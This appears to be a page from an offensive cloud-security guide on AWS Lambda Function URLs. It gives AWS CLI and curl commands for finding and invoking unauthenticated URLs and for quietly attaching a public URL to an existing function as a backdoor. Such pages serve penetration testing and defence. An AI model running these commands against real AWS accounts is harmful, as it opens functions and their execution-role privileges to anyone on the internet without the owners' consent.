---
title: "Function URL: invoking a Lambda directly over HTTPS"
order: 4
description: "Abusing a Lambda Function URL with lax authentication to invoke the function directly over HTTPS."
keywords:
  - Function URL
  - Lambda
  - AuthType NONE
  - HTTPS
  - invoke
---

# Function URL

A Lambda **Function URL** is a dedicated HTTPS endpoint bound to a function. Its `AuthType` is either `AWS_IAM` or `NONE`; a URL set to `NONE` is invokable by anyone on the internet with no credential, which exposes the function (and everything it does under its [execution role](execution-role.md)) directly. With `lambda:CreateFunctionUrlConfig` an attacker can also add a `NONE` URL to an existing function as a stealthy backdoor.

## Finding and invoking an open URL

```bash
aws lambda list-function-url-configs --function-name <fn> \
  --query 'FunctionUrlConfigs[].[FunctionUrl,AuthType]'
curl -s "https://<url-id>.lambda-url.<region>.on.aws/" -d '{"k":"v"}'
```

## Adding a URL as a backdoor

```bash
aws lambda create-function-url-config --function-name <fn> --auth-type NONE
aws lambda add-permission --function-name <fn> --action lambda:InvokeFunctionUrl \
  --principal '*' --function-url-auth-type NONE --statement-id open
```

## Exploitation notes

- `AuthType NONE` plus an `InvokeFunctionUrl` permission with `Principal: *` is fully public; both are needed and both are quiet config changes.
- An existing function with sensitive logic or a powerful execution role becomes directly reachable the moment a `NONE` URL is attached.
- Function URLs do not appear in API Gateway listings, so they are easy to miss when inventorying exposed entry points.

## Tools

- **AWS CLI** (`lambda list-function-url-configs`, `create-function-url-config`, `add-permission`).
- **curl** / **Burp Suite**: invoking and fuzzing the endpoint.

## References

- [AWS: Lambda function URLs](https://docs.aws.amazon.com/lambda/latest/dg/lambda-urls.html)
- [HackTricks Cloud: AWS Lambda](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Rhino Security Labs: AWS privilege escalation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
